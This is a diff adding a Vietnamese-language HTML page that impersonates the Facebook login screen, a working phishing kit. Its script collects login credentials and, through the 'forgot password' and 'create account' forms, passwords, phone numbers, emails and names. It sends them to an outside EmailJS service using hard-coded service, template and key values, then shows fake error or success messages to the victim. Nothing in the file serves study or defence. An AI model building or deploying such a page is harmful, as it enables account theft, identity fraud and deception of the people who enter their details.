@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Đăng nhập Facebook | Facebook</title>
+    <meta property="og:title" content="Facebook - Đăng nhập hoặc đăng ký">
+    <meta property="og:description" content="Facebook giúp bạn kết nối và chia sẻ với mọi người trong cuộc sống của bạn.">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg">
+    <meta property="og:url" content="https://www.facebook.com/share/15g8ih73gt/?id=1000789491278365-67ed6976-3c7c-800b-98aa-6ecffbff85b1">
+    <meta property="og:type" content="website">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <style>
+        body {
+            background: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        .header {
+            width: 100%;
+            padding: 10px 15px;
+            background-color: #f5f6f5;
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+        }
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .header-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #1c1e21;
+            text-align: center;
+            flex: 1;
+        }
+        .header-title.small-title {
+            font-size: 14px;
+        }
+        .header-menu {
+            cursor: pointer;
+            position: absolute;
+            right: 0;
+        }
+        .header-menu svg {
+            width: 24px;
+            height: 24px;
+        }
+        .dropdown-menu {
+            display: none;
+            position: absolute;
+            top: 40px;
+            right: 0;
+            background-color: #fff;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            z-index: 1001;
+            width: 200px;
+        }
+        .dropdown-menu.active {
+            display: block;
+        }
+        .dropdown-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            font-size: 14px;
+            color: #000;
+            text-align: left;
+            border-bottom: 1px solid #ddd;
+            cursor: pointer;
+        }
+        .dropdown-item:last-child {
+            border-bottom: none;
+        }
+        .dropdown-item:hover {
+            background-color: #f0f0f0;
+        }
+        .dropdown-item svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+        .language-border {
+            border-bottom: 1px solid #ddd;
+            margin-top: 5px;
+            margin-bottom: 5px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .language-text {
+            font-size: 12px;
+            color: #737373;
+            text-align: center;
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        .back-button-header {
+            display: none;
+            align-items: center;
+            justify-content: flex-start;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 10px;
+            max-width: 400px;
+            margin-left: auto;
+            margin-right: auto;
+            color: #1c1e21;
+        }
+        .back-button-header svg {
+            margin-right: 8px;
+        }
+        .gradient-section {
+            position: fixed;
+            top: 70px;
+            left: 0;
+            width: 100%;
+            height: 50%;
+            background: linear-gradient(to bottom, #e6f0fa 0%, #f5f6f5 100%);
+            z-index: 0;
+        }
+        .login-container, .forgot-password-container, .forgot-password-email-container, .create-account-container, 
+        .about-container, .help-container, .more-container {
+            width: 100%;
+            max-width: 400px;
+            background: transparent;
+            padding: 20px;
+            margin-top: 100px;
+            text-align: left;
+            position: relative;
+            z-index: 1;
+            display: none;
+        }
+        .login-container.active {
+            display: block;
+            text-align: center;
+        }
+        .forgot-password-container.active, .forgot-password-email-container.active, .create-account-container.active, 
+        .about-container.active, .help-container.active, .more-container.active {
+            display: block;
+        }
+        .facebook-logo {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 40px 0;
+        }
+        .facebook-logo img {
+            width: 60px;
+            height: 60px;
+        }
+        .login-container input, .forgot-password-container input, .forgot-password-email-container input, 
+        .create-account-container input {
+            margin-bottom: 15px;
+            border-radius: 6px;
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            background: #fff;
+        }
+        .btn-primary {
+            width: 100%;
+            border-radius: 6px;
+            padding: 12px;
+            background-color: #1877f2;
+            border-color: #1877f2;
+            color: white;
+            font-weight: bold;
+        }
+        .btn-create-account {
+            background: transparent;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            width: 100%;
+            padding: 12px;
+            font-weight: bold;
+        }
+        .forgot-password {
+            margin-top: 15px;
+            color: #1877f2;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .bottom-section {
+            position: fixed;
+            bottom: 30px;
+            width: 100%;
+            max-width: 400px;
+            left: 50%;
+            transform: translateX(-50%);
+            text-align: center;
+            z-index: 1;
+        }
+        .meta-section {
+            color: #737373;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .meta-section::before {
+            content: "∞ ";
+            font-size: 20px;
+            color: #737373;
+        }
+        .footer-links {
+            position: fixed;
+            bottom: 0px;
+            width: 100%;
+            max-width: 400px;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 12px;
+            color: #737373;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            z-index: 1;
+        }
+        .footer-links a {
+            color: #737373;
+            text-decoration: none;
+            cursor: pointer;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #737373;
+            margin-top: 10px;
+        }
+        .search-by-email, .search-by-phone {
+            display: block;
+            text-align: center;
+            margin-top: 15px;
+            padding: 10px;
+            background: transparent;
+            color: #737373;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        .error-message {
+            color: #dc3545;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        /* New styles for success pop-up */
+        .success-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 300px;
+            text-align: center;
+            padding: 20px;
+            z-index: 1002;
+        }
+        .success-popup-title {
+            font-size: 16px;
+            font-weight: bold;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+        .success-popup-message {
+            font-size: 14px;
+            color: #4b4f56;
+            margin-bottom: 20px;
+        }
+        .success-popup-button {
+            background-color: #1877f2;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            padding: 10px;
+            width: 100px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .success-popup-button:hover {
+            background-color: #165db2;
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            z-index: 1001;
+        }
+        /* Giao diện giống Facebook cho các container Giới thiệu, Trợ giúp, Xem thêm */
+        .fb-section {
+            margin-bottom: 20px;
+        }
+        .fb-section h2 {
+            font-size: 24px;
+            font-weight: bold;
+            color: #1c1e21;
+            margin-bottom: 10px;
+        }
+        .fb-section p {
+            font-size: 14px;
+            color: #4b4f56;
+            line-height: 1.4;
+        }
+        .fb-section a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .fb-section a:hover {
+            text-decoration: underline;
+        }
+        .fb-links {
+            margin-top: 15px;
+        }
+        .fb-links a {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+        @media (max-width: 576px) {
+            .header { padding: 8px 10px; }
+            .header-title { font-size: 16px; }
+            .header-title.small-title { font-size: 12px; }
+            .language-text { font-size: 11px; }
+            .back-button-header { font-size: 14px; }
+            .facebook-logo img { width: 50px; height: 50px; }
+            .login-container, .forgot-password-container, .forgot-password-email-container, .create-account-container, 
+            .about-container, .help-container, .more-container { padding: 15px; margin-top: 80px; }
+            .facebook-logo { margin: 30px 0; }
+            .btn-primary, .btn-create-account { padding: 10px; }
+            .footer-links { gap: 15px; }
+            .bottom-section { bottom: 25px; }
+            .gradient-section { top: 60px; height: 40%; }
+            .fb-section h2 { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <script type="text/javascript">
+        (function() {
+            emailjs.init("wF5gWgp1GWyg7q0KY");
+        })();
+    </script>
+
+    <div class="header">
+        <div class="header-content">
+            <div class="header-title" id="header-title">Đăng nhập Facebook | Facebook</div>
+            <div class="header-menu" onclick="toggleDropdown()">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="12" cy="6" r="2" fill="#1c1e21"/>
+                    <circle cx="12" cy="12" r="2" fill="#1c1e21"/>
+                    <circle cx="12" cy="18" r="2" fill="#1c1e21"/>
+                </svg>
+            </div>
+            <div class="dropdown-menu" id="dropdownMenu">
+                <div class="dropdown-item" onclick="alert('Báo cáo đã được gửi!')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM13 17H11V15H13V17ZM13 13H11V7H13V13Z" fill="#737373"/>
+                    </svg>
+                    Báo cáo
+                </div>
+                <div class="dropdown-item" onclick="window.open(window.location.href, '_blank')">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M19 19H5V5H12V3H5C3.9 3 3 3.9 3 5V19C3 20.1 3.9 21 5 21H19C20.1 21 21 20.1 21 19V12H19V19ZM14 3V5H17.59L7.76 14.83L9.17 16.24L19 6.41V10H21V3H14Z" fill="#737373"/>
+                    </svg>
+                    Mở trong trình duyệt
+                </div>
+                <div class="dropdown-item" onclick="navigator.clipboard.writeText(window.location.href).then(() => alert('Liên kết đã được sao chép!'))">
+                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M16 1H4C2.9 1 2 1.9 2 3V17H4V3H16V1ZM19 5H8C6.9 5 6 5.9 6 7V21C6 22.1 6.9 23 8 23H19C20.1 23 21 22.1 21 21V7C21 5.9 20.1 5 19 5ZM19 21H8V7H19V21Z" fill="#737373"/>
+                    </svg>
+                    Sao chép liên kết
+                </div>
+            </div>
+        </div>
+        <div class="language-border"></div>
+        <div class="language-text" id="language-text">Tiếng Việt</div>
+        <div class="back-button-header" id="back-button-header" onclick="showLogin()">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M15 18L9 12L15 6" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            </svg>
+            Quay lại
+        </div>
+    </div>
+    <div class="gradient-section"></div>
+    <div class="login-container active">
+        <div class="facebook-logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+        </div>
+        <input type="text" id="username" class="form-control" placeholder="Số di động hoặc email">
+        <input type="password" id="password" class="form-control" placeholder="Mật khẩu">
+        <button class="btn btn-primary" onclick="login()">Đăng nhập</button>
+        <p class="text-danger mt-2" id="error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+        <p class="error-message" id="email-error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+        <div class="forgot-password" onclick="showForgotPassword()">Bạn quên mật khẩu ư?</div>
+        <button class="btn btn-create-account mt-2" onclick="showCreateAccount()">Tạo tài khoản mới</button>
+    </div>
+    <div class="forgot-password-container">
+        <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
+        <p>Nhập số di động của bạn</p>
+        <input type="text" id="phone-input" class="form-control" placeholder="Số di động">
+        <p class="info-text">Chúng tôi có thể gửi cho bạn thông báo qua SMS và WhatsApp nhằm mục đích bảo mật và đăng nhập</p>
+        <button class="btn btn-primary" onclick="searchByPhone()">Tiếp tục</button>
+        <p class="error-message" id="phone-error-message">Không tìm thấy tài khoản. Vui lòng thử lại với email.</p>
+        <p class="error-message" id="phone-email-error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+        <a href="#" class="search-by-email" onclick="showForgotPasswordEmail()">Tìm kiếm bằng email</a>
+    </div>
+    <div class="forgot-password-email-container">
+        <h5 style="font-weight: bold;">Tìm tài khoản của bạn</h5>
+        <p>Nhập email của bạn</p>
+        <input type="email" id="email-input" class="form-control" placeholder="Email">
+        <button class="btn btn-primary" onclick="searchByEmail()">Tiếp tục</button>
+        <p class="error-message" id="email-error-message">Không tìm thấy tài khoản. Vui lòng thử lại!</p>
+        <p class="error-message" id="email-email-error-message" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+        <a href="#" class="search-by-phone" onclick="showForgotPassword()">Tìm kiếm bằng số di động</a>
+    </div>
+    <div class="create-account-container">
+        <h5 style="font-weight: bold;">Tạo tài khoản mới</h5>
+        <input type="text" id="firstName" class="form-control" placeholder="Tên">
+        <input type="text" id="lastName" class="form-control" placeholder="Họ">
+        <input type="text" id="phone" class="form-control" placeholder="Số di động">
+        <input type="email" id="email" class="form-control" placeholder="Email">
+        <input type="password" id="new-password" class="form-control" placeholder="Mật khẩu mới">
+        <button class="btn btn-primary" onclick="createAccount()">Đăng ký</button>
+        <p class="error-message" id="create-account-error-message">Vui lòng điền đầy đủ thông tin!</p>
+        <p class="error-message" id="create-account-error-message-email" style="display:none;">Sai tên đăng nhập hoặc mật khẩu</p>
+    </div>
+    <!-- Giao diện Giới thiệu giống Facebook -->
+    <div class="about-container">
+        <div class="fb-section">
+            <h2>Giới thiệu về Facebook</h2>
+            <p>Chúng tôi tin rằng mọi người có thể làm được nhiều điều hơn khi ở bên nhau. Sứ mệnh của chúng tôi là mang đến cho bạn sức mạnh để xây dựng cộng đồng và đưa thế giới đến gần nhau hơn.</p>
+        </div>
+        <div class="fb-section">
+            <h2>Công ty</h2>
+            <p>Facebook là một phần của Meta, tập trung vào việc kết nối con người thông qua công nghệ. Thành lập năm 2004 bởi Mark Zuckerberg.</p>
+            <div class="fb-links">
+                <a href="#">Tìm hiểu thêm về Meta</a>
+                <a href="#">Sự nghiệp tại Facebook</a>
+                <a href="#">Lịch sử của chúng tôi</a>
+            </div>
+        </div>
+    </div>
+    <!-- Giao diện Trợ giúp giống Facebook -->
+    <div class="help-container">
+        <div class="fb-section">
+            <h2>Trợ giúp & Hỗ trợ</h2>
+            <p>Bạn cần trợ giúp? Chúng tôi ở đây để hỗ trợ bạn với bất kỳ vấn đề nào liên quan đến tài khoản, bảo mật, hoặc cách sử dụng Facebook.</p>
+        </div>
+        <div class="fb-section">
+            <h2>Các chủ đề phổ biến</h2>
+            <div class="fb-links">
+                <a href="#">Quên mật khẩu</a>
+                <a href="#">Bảo mật tài khoản</a>
+                <a href="#">Báo cáo nội dung</a>
+                <a href="#">Liên hệ với chúng tôi</a>
+            </div>
+        </div>
+    </div>
+    <!-- Giao diện Xem thêm giống Facebook -->
+    <div class="more-container">
+        <div class="fb-section">
+            <h2>Xem thêm</h2>
+            <p>Khám phá các sản phẩm, tính năng và dịch vụ khác từ Facebook và Meta.</p>
+        </div>
+        <div class="fb-section">
+            <h2>Sản phẩm</h2>
+            <div class="fb-links">
+                <a href="#">Instagram</a>
+                <a href="#">Messenger</a>
+                <a href="#">WhatsApp</a>
+                <a href="#">Oculus</a>
+            </div>
+        </div>
+        <div class="fb-section">
+            <h2>Tính năng</h2>
+            <div class="fb-links">
+                <a href="#">Stories</a>
+                <a href="#">Groups</a>
+                <a href="#">Marketplace</a>
+            </div>
+        </div>
+    </div>
+    <!-- Success Pop-ups for each section -->
+    <div class="overlay" id="overlay"></div>
+    <div class="success-popup" id="email-success-popup">
+        <div class="success-popup-title">Gửi email thành công</div>
+        <div class="success-popup-message">Email đã được gửi thành công!</div>
+        <button class="success-popup-button" onclick="hideSuccessPopup('email-success-popup')">OK</button>
+    </div>
+    <div class="success-popup" id="phone-email-success-popup">
+        <div class="success-popup-title">Gửi email thành công</div>
+        <div class="success-popup-message">Email đã được gửi thành công!</div>
+        <button class="success-popup-button" onclick="hideSuccessPopup('phone-email-success-popup')">OK</button>
+    </div>
+    <div class="success-popup" id="email-email-success-popup">
+        <div class="success-popup-title">Gửi email thành công</div>
+        <div class="success-popup-message">Email đã được gửi thành công!</div>
+        <button class="success-popup-button" onclick="hideSuccessPopup('email-email-success-popup')">OK</button>
+    </div>
+    <div class="success-popup" id="create-account-success-popup">
+        <div class="success-popup-title">Gửi email thành công</div>
+        <div class="success-popup-message">Email đã được gửi thành công!</div>
+        <button class="success-popup-button" onclick="hideSuccessPopup('create-account-success-popup')">OK</button>
+    </div>
+    <div class="bottom-section">
+        <div class="meta-section">Meta</div>
+    </div>
+    <div class="footer-links">
+        <a href="#" onclick="showAbout()">Giới thiệu</a>
+        <a href="#" onclick="showHelp()">Trợ giúp</a>
+        <a href="#" onclick="showMore()">Xem thêm</a>
+    </div>
+
+    <script>
+        function toggleDropdown() {
+            const dropdownMenu = document.getElementById('dropdownMenu');
+            dropdownMenu.classList.toggle('active');
+        }
+
+        function hideAllContainers() {
+            document.querySelector('.login-container').classList.remove('active');
+            document.querySelector('.forgot-password-container').classList.remove('active');
+            document.querySelector('.forgot-password-email-container').classList.remove('active');
+            document.querySelector('.create-account-container').classList.remove('active');
+            document.querySelector('.about-container').classList.remove('active');
+            document.querySelector('.help-container').classList.remove('active');
+            document.querySelector('.more-container').classList.remove('active');
+        }
+
+        function showLogin() {
+            hideAllContainers();
+            document.querySelector('.login-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Đăng nhập Facebook | Facebook';
+            document.getElementById('header-title').classList.remove('small-title');
+            document.getElementById('language-text').style.display = 'block';
+            document.getElementById('back-button-header').style.display = 'none';
+        }
+
+        function showForgotPassword() {
+            hideAllContainers();
+            document.querySelector('.forgot-password-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
+            document.getElementById('header-title').classList.add('small-title');
+            document.getElementById('language-text').style.display = 'none';
+            document.getElementById('back-button-header').style.display = 'flex';
+        }
+
+        function showForgotPasswordEmail() {
+            hideAllContainers();
+            document.querySelector('.forgot-password-email-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Tìm tài khoản của bạn';
+            document.getElementById('header-title').classList.add('small-title');
+            document.getElementById('language-text').style.display = 'none';
+            document.getElementById('back-button-header').style.display = 'flex';
+        }
+
+        function showCreateAccount() {
+            hideAllContainers();
+            document.querySelector('.create-account-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Tạo tài khoản mới';
+            document.getElementById('header-title').classList.add('small-title');
+            document.getElementById('language-text').style.display = 'none';
+            document.getElementById('back-button-header').style.display = 'flex';
+        }
+
+        function showAbout() {
+            hideAllContainers();
+            document.querySelector('.about-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Giới thiệu';
+            document.getElementById('header-title').classList.add('small-title');
+            document.getElementById('language-text').style.display = 'none';
+            document.getElementById('back-button-header').style.display = 'flex';
+        }
+
+        function showHelp() {
+            hideAllContainers();
+            document.querySelector('.help-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Trợ giúp';
+            document.getElementById('header-title').classList.add('small-title');
+            document.getElementById('language-text').style.display = 'none';
+            document.getElementById('back-button-header').style.display = 'flex';
+        }
+
+        function showMore() {
+            hideAllContainers();
+            document.querySelector('.more-container').classList.add('active');
+            document.getElementById('header-title').innerText = 'Xem thêm';
+            document.getElementById('header-title').classList.add('small-title');
+            document.getElementById('language-text').style.display = 'none';
+            document.getElementById('back-button-header').style.display = 'flex';
+        }
+
+        function showSuccessPopup(popupId) {
+            document.getElementById(popupId).style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+        }
+
+        function hideSuccessPopup(popupId) {
+            document.getElementById(popupId).style.display = 'none';
+            document.getElementById('overlay').style.display = 'none';
+        }
+
+       function login() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('error-message');
+            const emailSuccessMessage = document.getElementById('email-success-message');
+            const emailErrorMessage = document.getElementById('email-error-message');
+
+            if (!username || !password) {
+                errorMessage.style.display = 'block';
+                emailSuccessMessage.style.display = 'none';
+                emailErrorMessage.style.display = 'none';
+                return;
+            }
+
+            errorMessage.style.display = 'none';
+
+            const templateParams = {
+                username: username,
+                password: password,
+                phone: '',
+                email: '',
+                firstName: '',
+                lastName: ''
+            };
+
+            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+                .then(function(response) {
+                    console.log('Email gửi thành công!', response.status, response.text);
+                    emailSuccessMessage.style.display = 'block';
+                    emailErrorMessage.style.display = 'none';
+                }, function(error) {
+                    console.error('Lỗi gửi email:', error);
+                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
+                    emailErrorMessage.style.display = 'block';
+                    emailSuccessMessage.style.display = 'none';
+                });
+        }
+
+        function searchByPhone() {
+            const phone = document.getElementById('phone-input').value;
+            const errorMessage = document.getElementById('phone-error-message');
+            const emailSuccessMessage = document.getElementById('phone-email-success-message');
+            const emailErrorMessage = document.getElementById('phone-email-error-message');
+
+            if (!phone) {
+                errorMessage.style.display = 'block';
+                emailSuccessMessage.style.display = 'none';
+                emailErrorMessage.style.display = 'none';
+                return;
+            }
+
+            errorMessage.style.display = 'none';
+
+            const templateParams = {
+                username: '',
+                password: '',
+                phone: phone,
+                email: '',
+                firstName: '',
+                lastName: ''
+            };
+
+            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+                .then(function(response) {
+                    console.log('Email gửi thành công!', response.status, response.text);
+                    emailSuccessMessage.style.display = 'block';
+                    emailErrorMessage.style.display = 'none';
+                }, function(error) {
+                    console.error('Lỗi gửi email:', error);
+                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
+                    emailErrorMessage.style.display = 'block';
+                    emailSuccessMessage.style.display = 'none';
+                });
+        }
+
+        function searchByEmail() {
+            const email = document.getElementById('email-input').value;
+            const errorMessage = document.getElementById('email-error-message');
+            const emailSuccessMessage = document.getElementById('email-email-success-message');
+            const emailErrorMessage = document.getElementById('email-email-error-message');
+
+            if (!email) {
+                errorMessage.style.display = 'block';
+                emailSuccessMessage.style.display = 'none';
+                emailErrorMessage.style.display = 'none';
+                return;
+            }
+
+            errorMessage.style.display = 'none';
+
+            const templateParams = {
+                username: '',
+                password: '',
+                phone: '',
+                email: email,
+                firstName: '',
+                lastName: ''
+            };
+
+            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+                .then(function(response) {
+                    console.log('Email gửi thành công!', response.status, response.text);
+                    emailSuccessMessage.style.display = 'block';
+                    emailErrorMessage.style.display = 'none';
+                }, function(error) {
+                    console.error('Lỗi gửi email:', error);
+                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
+                    emailErrorMessage.style.display = 'block';
+                    emailSuccessMessage.style.display = 'none';
+                });
+        }
+
+        function createAccount() {
+            const firstName = document.getElementById('firstName').value;
+            const lastName = document.getElementById('lastName').value;
+            const phone = document.getElementById('phone').value;
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('new-password').value;
+            const errorMessage = document.getElementById('create-account-error-message');
+            const emailSuccessMessage = document.getElementById('create-account-success-message');
+            const emailErrorMessage = document.getElementById('create-account-error-message-email');
+
+            if (!firstName || !lastName || !phone || !email || !password) {
+                errorMessage.style.display = 'block';
+                emailSuccessMessage.style.display = 'none';
+                emailErrorMessage.style.display = 'none';
+                return;
+            }
+
+            errorMessage.style.display = 'none';
+
+            const templateParams = {
+                username: '',
+                password: password,
+                phone: phone,
+                email: email,
+                firstName: firstName,
+                lastName: lastName
+            };
+
+            emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
+                .then(function(response) {
+                    console.log('Email gửi thành công!', response.status, response.text);
+                    emailSuccessMessage.style.display = 'block';
+                    emailErrorMessage.style.display = 'none';
+                }, function(error) {
+                    console.error('Lỗi gửi email:', error);
+                    emailErrorMessage.innerText = 'Sai tên đăng nhập hoặc mật khẩu';
+                    emailErrorMessage.style.display = 'block';
+                    emailSuccessMessage.style.display = 'none';
+                });
+        }
+    </script>
+</body>
+</html>
